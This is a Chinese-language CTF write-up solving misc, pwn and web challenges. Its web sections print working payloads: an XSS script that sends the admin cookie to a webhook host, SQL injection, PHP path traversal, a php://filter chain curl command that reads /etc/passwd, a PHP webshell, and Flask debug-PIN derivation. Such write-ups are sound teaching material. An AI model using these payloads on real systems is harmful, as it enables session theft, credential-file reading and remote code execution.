
[TOC]
# Misc
## There Is Nothing Here (1)
- 題目是半張的圖片，且檔案名稱叫做beautiful_square_view，因此馬上想到是要把照片比例調到正方形大小
> ![image](https://hackmd.io/_uploads/rkEZDcDFa.png)
- 用010 editor打開後去修改長寬的地方把長寬都改成一樣後就變成了一張圖片
> ![image](https://hackmd.io/_uploads/SJI8_cwFp.png)
- 一開始沒有發現這是qr code因為原本以為flag會直接出現在圖片下半部因此有些錯愕，但看到縮圖後直接發現是QR code 就得到flag了
> ![image](https://hackmd.io/_uploads/Hy0w_5Dta.png)

> ![image](https://hackmd.io/_uploads/Hy_h4rqtp.png)

## 🟥 🟩 🟦
![image](https://hackmd.io/_uploads/rJjVL1l5T.png)
圖片如下，可以看到他似乎是一個 QR code，但是有填奇怪的顏色

![image](https://hackmd.io/_uploads/rJ6OIJg9a.png)


而根據題目說明可以猜測跟 RGB 的 channel 有關，使用 [stegsolve](https://wiki.bi0s.in/steganography/stegsolve/)  或[這個](https://wsr.imagej.net/distros/win/ij154-win-java8.zip)

分別檢視 Red Plane 7, Green Plane 7, Blue Plane 7 這三個 channel，可以看到會有三個不同的 QR code

![image](https://hackmd.io/_uploads/HyTtIkx9T.png)

![image](https://hackmd.io/_uploads/S1S9Ukx9a.png)

![image](https://hackmd.io/_uploads/rk09Lkgqp.png)

直接用手機來掃，可以讀到以下三個訊息

T{5_e3V15r63o_O0_ErNnCV11M45RW7

SR34_D13_3L_k0_ma_3_D0444a1_3h3

C05Rr_07A_UY0Np5R934_n1r_j1A_1}

可以看到 flag 應該是從上而下從左而右的順序來讀，拼湊一下就能拿到 flag

TSC{R0535_4Re_r3D_V101375_Ar3_6LU3_Yok0_0NO_p0m5_aRE_9r33N_4nD_C0nV4114r14_Maj4115_AR3_Wh173}
# Pwn
## Ret2win
這是source code 可以看到flag大概藏在`/bin/sh`這個地方
`gets()` 存在 buffer overflow 的問題
`gets` 函數無法檢查輸入的大小，這會導致當用戶輸入的數據大於緩衝區 str 的大小（32 個字節）時，將溢出緩衝區。
```c=
#include <stdio.h>
#include <stdlib.h>

void win(void){
    execve("/bin/sh", 0, 0);
}

int main(){
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    puts("baby pwn challenge!");
    char str[0x20];
    gets(str);
    return 0;
}

```
要想辦法從local variables跳到return address，題目給str是32bit，而saved rbp是8 bits(64位元8 bits,32位元4bit)，因此要40bit才能跳到return address
> ![image](https://hackmd.io/_uploads/ryfLGs15T.png)
用ida pro 看win的位置
> ![image](https://hackmd.io/_uploads/SkjAESqF6.png)
因為是little ㄟ底恩 所以要倒著寫
> ![image](https://hackmd.io/_uploads/ByV-SS9Kp.png)

> ![image](https://hackmd.io/_uploads/H1A7Br5Y6.png)

# Web
[官方writeup跟docker](https://github.com/Vincent550102/My-CTF-Challenge)
## Card Generator
> ![image](https://hackmd.io/_uploads/SkdXbtitp.png)
- 題目打開來是一個更新profile的網站跟分享給admin的
> ![image](https://hackmd.io/_uploads/Bk1triita.png)

- 在username的地方有XSS的洞 因此要想辦法拿到admin的cookie，因為share with admin的時候，admin在訪問時會帶上他的cookie訪問，我們可以用webhook或是requestbin來把cookie傳回給我們
>　![image](https://hackmd.io/_uploads/H1f2f2sFa.png)

> ![image](https://hackmd.io/_uploads/HJOCMnjYa.png)

- 如何偷admin cookie是參考[這個](https://stackoverflow.com/questions/72248884/how-to-steal-a-cookie-using-xss-script)
- 先輸入我們的payload 中間網址的地方改成我們webhook的，*是一定要的
```
<script>window.location='https://webhook.site/cd77b642-a9e1-490b-8bf2-b74dc0534ef2**?cookie=**'+document.cookie</script>
```
- 成功有拿到session
> ![image](https://hackmd.io/_uploads/rJfwB2sta.png)
- 這時把他share給admin就可以拿到他的session
> ![image](https://hackmd.io/_uploads/ByA5AfHca.png)
- 貼上到我們session得地方就可以成功拿到admin的權限了
> ![image](https://hackmd.io/_uploads/HyHU1nstT.png)

- 通常看到eyj或是ej開頭的都是jwt
- 把admin的session貼到jwt decoder裡頭 就會發現header有個link 網址後就得到flag了 
> ![image](https://hackmd.io/_uploads/rJ0kyXScT.png)

> ![image](https://hackmd.io/_uploads/r1Gm0siKT.png)


## My First Shopping Cart
- 試著找出隱藏的商品
> ![image](https://hackmd.io/_uploads/S1wu31TYa.png)

> ![image](https://hackmd.io/_uploads/HkSq3y6F6.png)

```
'or 1=1 limit 4,1 -- 
記得--要在同一行
```
- payload 都要在同一行
- limit 4,1意思為從第四個開始往下找一個
![image](https://hackmd.io/_uploads/HJqI3kTKT.png)

> ![image](https://hackmd.io/_uploads/HJxUFbnYT.png)
> 
> ![image](https://hackmd.io/_uploads/BymDYWhtp.png)

## 極之番『漩渦』
先去觀察他的docker file
- Line1 這題的 php 版本為 7.4.33
    - 可以透過此 [網站](https://3v4l.org/#v7.4.33) 來測試不同版本 php 行為
- Line7 通常最終會讓我們能 RCE，也告訴了我們 flag 的位置在根目錄
> ![image](https://hackmd.io/_uploads/rJhOMf0Fp.png)

### stage1
```php=
<?php
include('config.php');
echo '<h1>👻 Stage 1 / 4</h1>';

$A = $_GET['A'];
$B = $_GET['B'];

highlight_file(__FILE__);
echo '<hr>';

if (isset($A) && isset($B))
    if ($A != $B)
        if (strcmp($A, $B) == 0)
            if (md5($A) === md5($B))
                echo "<a href=$stage2>Go to stage2</a>";
            else die('ERROR: MD5(A) != MD5(B)');
        else die('ERROR: strcmp(A, B) != 0');
    else die('ERROR: A == B');
else die('ERROR: A, B should be given');
```
可以發現在 Line13 會需要讓 A != B，且在 Line13 會需要 strcmp($A, $B) == 0，代表了若 A 和 B 皆為字串時需要兩者相同，到這裡正常行為下就不太可能發生。我們繼續往下看，他還需要讓兩者的 md5 hash 值相同。

這題用到的是 php 中 array parameter 的技巧，php 中很多函式在處理到傳入參數為 array 時，會報 warning，但仍會回傳 NULL。

另外一個會用到的技巧是弱型別比較的技巧，在 php 中使用 == 來比較兩值時，將進行弱型別轉換，下圖範例。
![image](https://hackmd.io/_uploads/rJCdUfAYT.png)

![image](https://hackmd.io/_uploads/Bk9YIMAKa.png)
綜合以上兩種特性，傳入 A 和 B 不相同的兩個 array，就能導致通過 Line12 `A!=B` 的檢查，接下來 Line13 由於 `strcmp($A, $B)` 為 `NULL`，因此這個弱型別比較會是 true，最後 Line14 `md5($A)` 與 `md5($B)` 兩者皆為 NULL，因此 `md5($A) === md5($B)` 為 true

payload:
`stage1.php?A[]=1&B[]=3`

### stage2
```php=
<?php
include('config.php');
echo '<h1>👻 Stage 2 / 4</h1>';

$A = $_GET['A'];
$B = $_GET['B'];

highlight_file(__FILE__);
echo '<hr>';

if (isset($A) && isset($B))
    if ($A !== $B){
        $is_same = md5($A) == 0 and md5($B) === 0;
        if ($is_same)
            echo (md5($B) ? "QQ1" : md5($A) == 0 ? "<a href=$stage3?page=swirl.php>Go to stage3</a>" : "QQ2");
        else die('ERROR: $is_same is false');
    }
else die('ERROR: A, B should be given');
```
這題比起 stage1 多用到了一個知識點，在 php 中， = 的運算優先度是高於 and 的，若有以下 expression 時，結果會是 true。因此，在 Line13 我們只需要讓前面的為 true 即可。
![image](https://hackmd.io/_uploads/r1Gf4XRtp.png)
在 Line15 我們會用到的知識點是，三元運算子的錯誤使用，我們先假設 `md5($B)`是 false，`md5($A) == 0` 是 true
```
false ? "QQ1" : true ? "<a href=$stage3?page=swirl.php>Go to stage3</a>" : "QQ2"
```
會先處理前面的 `false ? "QQ1" : true`，因此運算式變這樣。
```
true ? "<a href=$stage3?page=swirl.php>Go to stage3</a>" : "QQ2"
```
payload:
`.php?A=true&B=false`

### stage3
```ph=
<?php
include('config.php');
echo '<h1>👻 Stage 3 / 4</h1>';

$page = $_GET['page'];

highlight_file(__FILE__);
echo '<hr>';
if (isset($page)) {
    $path = strtolower($_GET['page']);
    
    // filter \ _ /
    if (preg_match("/\\_|\//", $path)) {
        echo "<p>bad hecker detect! </p>";
    }else{
        $path = str_replace("..\\", "../", $path);
        $path = str_replace("..", ".", $path);
        echo $path;
        echo '<hr>';
        echo file_get_contents("./page/".$path);
    }
} else die('ERROR: page should be given');
```
這題的考點是 preg_match 的錯誤使用，雖然看起來傳入了 `/\\_|\//` 但其實 `\` 並不能正常被過濾，第一次的 `\` 被跳脫後，傳入 php 內的 regular expression parser 時只剩下一個 `\` 被拿來跳過 `_`，因此整個 preg_match 變成只有過濾 `_` `/`。

然後下方 Line16 又很好心的將 `..\` 轉為 `../`，我們就有機會 path traversal，要注意 Line17 將 `..` 轉為` .` 因此我們需要將 payload 的 `..` 變為 `....` 才能將整體變為 `../`。

能 path traversal 後，觀察到一直有個檔案我們很好奇，就是 config.php，我們第一個先去看他，即可看到通往 stage4 的檔案名稱了。
payload:
`stage3_099b3b060154898840f0ebdfb46ec78f.php?page=....\config.php`
檢查網頁原始碼就可以看到了
![image](https://hackmd.io/_uploads/r1pKQHCFa.png)

### stage4
```hp=
<?php
echo '<h1>👻 Stage 4 / 4</h1>';

highlight_file(__FILE__);
echo '<hr>';
extract($_POST);

if (isset($👀)) 
    include($👀);
else die('ERROR: 👀 should be given');
```
在 Line9 有個任意 include，但沒有$👀被賦值的地方。

可以看到他會讀取 $_POST["👀"] 並 include 進來，沒了，而這邊也是最後的階段，可想而知是要做 RCE 讀 flag 檔案

這題用到了 [extract](https://ithelp.ithome.com.tw/articles/10237388)，而且參數用了 $_POST 因此讓我們能操作 POST 參數，來覆蓋任意變數可以拿來蓋 $👀。

最後就是要 include 什麼，關於這個 LFI2RCE 我們有很多 [招](https://blog.stevenyu.tw/2022/05/07/advanced-local-file-inclusion-2-rce-in-2022/)，這邊就選擇 php filter chain [這個好用的](https://github.com/synacktiv/php_filter_chain_generator)，payload 可以參考 [這個](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)，即可成功 RCE。

用到的payload:[PayloadsAllTheThings
](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- 原理:把傳過去的get參數0改成指令
```
# vulnerable file: index.php
# vulnerable parameter: file
# executed command: id
# executed PHP code: <?=`$_GET[0]`;;?>
curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd"
```
先用id
![image](https://hackmd.io/_uploads/ryVEWwRta.png)
確定有成功rce
![image](https://hackmd.io/_uploads/ByNUbDCY6.png)
再來找根目錄(
dockerfile有題示
![image](https://hackmd.io/_uploads/S1WYbwCKa.png)

![image](https://hackmd.io/_uploads/SJJqZwCK6.png)
再cat他
![image](https://hackmd.io/_uploads/BJ-sbv0ta.png)

![image](https://hackmd.io/_uploads/S1Ro-PCYp.png)

![image](https://hackmd.io/_uploads/H1MCgvAKp.png)

## Palitan ng pera
題目有給原始碼，以下是 `index.php` 的關鍵邏輯
```php=
<?php
error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE);
include("currency.php");

$resultLink = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $region = $_POST["region"];
    $amount = $_POST["amount"];

    $isoName = $countryData[$region]["ISO"];
    $rate = $countryData[$region]["toTWD"];

    $convertedAmount = $amount * $rate ?: $amount;

    $htmlContent = "<html><body>";
    $htmlContent .= "<h1> Exchange result </h1>";
    $htmlContent .= "<p>{$amount} TWD = {$convertedAmount} {$isoName}</p>";
    $htmlContent .= "<a href='/'>Back to Home</a></body></html>";

    $filePath = "upload/" . md5(uniqid()) . "." . $isoName;
    file_put_contents($filePath, $htmlContent);

    $resultLink = "<a href='" . $filePath . "'> 👁️ exchange result</a>";
}
?>
```
可以看到他會根據 `$_POST["region"]` 來決定要用哪個國家的匯率，而` $_POST["amount"] `則是要換多少錢，而這兩個都是使用者可以控制的

另外可以看到當作完相關匯率計算之後，會寫一個 html 的內容到一個檔案中，檔案名稱是亂數，不過附檔名的部分是根據` $_POST["region"] `查詢 `countryData` 後的結果，而這個 `countryData` 是在 `currency.php `中

而基本上這個題目就只有這個功能，因此可以想像得到是要用 LFI 做 RCE，雖然檔案內容我們可以用 `$_POST["amount"] `來控制成 PHP webshell 的東西，但是附檔名的部份我們還是需要控制成 `.php `才能夠執行

不過實際去` currency.php `做一下搜尋之後，可以看到 Philippines 的 ISO name 恰巧就是 PHP，因此只要我們選擇國家是 Philippines，那麼附檔名就會是` .php`，這樣我們只要在檔案中寫入 PHP webshell 就可以 RCE 了
![image](https://hackmd.io/_uploads/rkJxwKJqp.png)
因此我們可以使用以下的輸入
```
region: Philippines
amount: <?php system($_GET['cmd']); ?>
```
在 `cmd` 參數的部分就可以執行指令做到 RCE
之後ls../../../就看到flag檔cat出來就可以了
![image](https://hackmd.io/_uploads/By5gwFy5a.png)

![image](https://hackmd.io/_uploads/rkgILFkca.png)

## Normal website
![image](https://hackmd.io/_uploads/rJqSk4M9T.png)

題目打開來是一個迴紋針的頁面(作者是說這在暗示要用pin以及是用flask做的網頁)
![image](https://hackmd.io/_uploads/BJlF1Nf5T.png)

圖片點開後發現是base64編碼的 因為`aGludC5qcGc%3D` 中的%3D是=的url encode
![image](https://hackmd.io/_uploads/r1SelEG96.png) 

![image](https://hackmd.io/_uploads/rySEl4zqa.png)

此時把題目給的資訊`/app/Dockerfile` 拿去base64 後去curl就可以拿到dockerfile資訊了

觀察這個 Dockerfile，可以發現以下幾件事。
- 這題使用的 image python:3.10-alpine
- 這題的 flask 有開啟 debug mode (此題關鍵)
- flag 的位置
![image](https://hackmd.io/_uploads/ByG7zNGcT.png)

可以看到 flag 是在檔案系統中，此外也可以看到 flask 是跑在 debug mode 下，且我們有任意讀檔的漏洞，因此我們可以嘗試用 flask pin RCE 的方式去執行指令

在flask開啟debug mode的情況下可以打開python console，就可以執行任意python檔，只是要輸入pin碼 像下面這樣 用path travseral到/console 我們的目標就是要找到這個pin碼
![image](https://hackmd.io/_uploads/HyD_tBM9p.png)


這邊參考了 [Werkzeug / Flask Debug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#pin-protected-path-traversal) 及 [flask计算pin码](https://blog.csdn.net/weixin_63231007/article/details/131659892) 的資料，相關腳本也是從裡面來改的

根據裡面的說明，我們需要找到以下的資訊
```
username 在可以任意文件讀的條件下讀 /etc/passwd進行猜測
modname 一般是flask.app
getattr(app, "__name__", app.__class__.__name__)  一般是Flask
moddir flask庫下app.py的絕對路徑    可以通過報錯獲取
int(uuid,16)    即 當前網絡的mac地址的十進制數
get_machine_id()     機器的id
```
```
username 在dockerfile就有看到了 是 daemon
modname 是flask.app
getattr(app, "__name__", app.__class__.__name__)  一般是Flask
moddir flask庫下app.py的絕對路徑 透過報錯獲得是  "/usr/local/lib/python3.10/site-packages/flask/app.py"
MAC address 可以從 /sys/class/net/eth0/address 中找到 02:42:0a:00:01:fa
machine id 根據參考資料要讀取 /proc/sys/kernel/random/boot_id 及 /proc/self/cgroup 的東西並進行串接 為96f33aa0-36cf-48a8-8ced-c2e3aa85b7ae
```
`/usr/local/lib/python3.10/site-packages/flask/app.py`
![image](https://hackmd.io/_uploads/r1ljNi45p.png)

`/sys/class/net/eth0/address`
![image](https://hackmd.io/_uploads/SkMAPoE9p.png)

![image](https://hackmd.io/_uploads/Hy4ldjVcp.png)

`/proc/sys/kernel/random/boot_id`
![image](https://hackmd.io/_uploads/HkqDOoNqp.png)
為 `96f33aa0-36cf-48a8-8ced-c2e3aa85b7ae`

`/proc/self/cgroup`
![image](https://hackmd.io/_uploads/HyYhds49T.png)
是空的因此不用串接

之後照著exploit輸入 只是把usernames那些進行修改 就可以跑出pin碼了
![image](https://hackmd.io/_uploads/SyGAl64qT.png)

![image](https://hackmd.io/_uploads/rJDAgT49p.png)

進入console後就可以進行python指令並獲得flag
![image](https://hackmd.io/_uploads/SyzxbaEcT.png)

這是為什麼不能不輸入`/`的原因
![image](https://hackmd.io/_uploads/By77-T49T.png)

![image](https://hackmd.io/_uploads/BJveb64ca.png)
